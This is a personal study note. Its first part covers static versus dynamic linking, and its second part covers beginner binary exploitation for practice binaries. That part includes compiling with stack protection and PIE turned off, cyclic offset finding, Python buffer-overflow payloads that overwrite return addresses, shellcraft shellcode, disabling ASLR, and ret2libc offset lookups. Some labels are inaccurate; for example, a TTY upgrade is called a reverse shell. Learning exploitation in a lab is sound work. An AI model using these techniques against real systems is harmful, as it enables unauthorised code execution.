---
title:  2022-06-30
tags:
  - linker
programming-languagues:
created: 2022-06-30
---
# 2022-06-30
---
# Linker
Linking is the process of bringing external programs together required by the one we write for its successful execution. **Static** and **dynamic** linking are two processes of collecting and combining multiple object files in order to create a single executable.

Linking can happen at both **compile** and **load** time. 

- Compile time: source code is translated into machine code.
- Load time: program is loaded into memory by the loader, and even at run time, by application programs.

## Static Linking
It is the process of copying all library modules used in the program into the final executable image.

This is performed by the linker and it is done as the last step of the compilation process. The linker combines library routines with the program code in order to resolve external references, and to generate an executable image suitable for loading into memory. When the program is loaded, the operating system places into memory a single file that contains the executable code and data.

This statically linked file includes both the calling program and the called program.

Statically linked files are significantly larger in size because external programs are built into the executable files.

They also take constant load time every time it is loaded into the memory for execution and if anything is changed in the program, it has to be recompiled and re-linked again else the changes won't reflect in existing executable file.

Programs in general are faster though and all code is contained in a single executable module. Therefore, they never run into compatibility issues.

## Dynamically Linking
The names of the external libraries (shared libraries) are placed in the final executable file while the actual linking takes place at run time when both executable file and libraries are placed in memory. Dynamically linking lets several programs use a single copy of executable module.

It is performed at run time by the OS and only one copy of the shared library is kept in memory. This significantly reduces the size of executable programs, thereby saving memory and disk space.

Individual shared modules can be updated and re-compiled, it is one of the greatest advantage. Additionally,  load time might be reduced if the shared library code is already in memory.

They do depend on a compatible library. Therefore, if the library changes, applications might need to be re-worked.

---
# Binary Exploitation
## 00
- Check file vulnerabilities:
```bash
checksec --file <filename>
```

- Gets rid of Stack, NX and PIE protection (-m32 changes to 32bits):
```bash
gcc <filename>.c -o <filename> -fno-stack-protector -z execstack -no-pie -m32
```

## 01
GDB-Pwndbg:
- It breaks exactly where the breakpoint is.

To view a variable/condition you can use the code below. This would print the location of the result, so it is a pointer to a register that holds it.
```bash
x $ebp - 0xc
```

You can then change that register like this:
```bash
set *0xffffceac = 1
```

## 02
If file type is **LSB** then reverse order, for example _dead_ would be _daed_. To get it:

```bash
python2 -c 'print 32 * "A" + "\xef\xbe\xad\xde"'
```

Send to a file and run with it: (xD)
```bash
python2 -c 'print 32 * "A" + "\xef\xbe\xad\xde"' > payload
./runMeImaFile < payload
```

## 03
Radare2:
```bash
aa
afl
```

We can use `cyclic 100` in `gdb-pwndbg` to generate a pattern, then run that into the program. We then get the characters in the register (eg `eip`) and run `cyclic -l <string>`, so for example: 
```bash
cyclic -l haaa
```

It will return how many bytes we need to overflow.

If the function we want to access is in `0x08049182` for example, we can do:
```bash
python2 -c 'print "A" * 28 + "\x82\x91\x04\x08"' > payload
```

```bash
ropper --file ret2win_params --search "pop rsi"
```

## 04
We check the `cycle`, then figure out how much to overflow. We find the `return` address (what function returns), set a breakpoint to it then run the program with the payload generated.

deadbeef = `\xef\xbe\xad\xde`

When a function is called, the return pointer is pushed to the stack, so it knows where to return to, followed by any function parameters.

With 64bits, we have to populate the registers not just send the parameters, for example `rdi` and `rsi`. We also when running `cyclic` take the values from the `RSP`, for example the first four.

## 05
Getting a shell:
```bash
shellcraft -l
shellcraft i386.linux.sh

# to get it in assembly:
shellcraft i386.linux.sh -f a
```

To get a reverse shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
# control + z
stty raw -echo; fg;
export TERM=xterm
```

## 06
This file is safer as you can see with `checksec`. Therefore, we need to execute `bin/sh` from LibC.

To find libC we can run `ldd <filename>`.

To turn off randomiser:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

To get libC address:
```bash
ldd <filename>
```

To find the offset from base libC to system:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

To find offset to `/bin/sh` for example:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/bash"
```

### Useful tools
- Ghidra
- GDB
- Radare2
- Ropper
- GDB-PwnDBG
- LTrace